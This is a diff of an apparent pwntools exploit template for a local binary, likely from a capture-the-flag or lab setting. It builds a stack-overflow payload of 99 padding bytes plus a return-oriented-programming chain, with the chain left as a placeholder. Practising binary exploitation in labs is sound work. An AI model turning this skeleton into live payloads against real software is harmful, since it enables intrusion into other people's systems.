@@ -7,19 +7,19 @@ io = process()      # Start the binary in a process
 
 rop = ROP(elf)      # Create ROP object
 
-# rop.system(0x01, 0x02)       # Call functions and provide their arguments
-
-# Print out the ropchain to be used
-print("ROP Dump:")
-print(rop.dump())
-print("ROP Chain:")
-print(rop.chain())
-
 offset = 99     # offset to the EIP/RIP
+
+# Call functions and provide their arguments
+# rop.system(0x01, 0x02)
+# OR
+# Build the exploit
+rop.raw([])
+
+rop_chain = rop.chain()
 
 payload = b""
 payload += b"A" * offset
-payload += rop.chain()
+payload += rop_chain
 
 io.recvuntil(b"> ")
 io.sendline(payload)
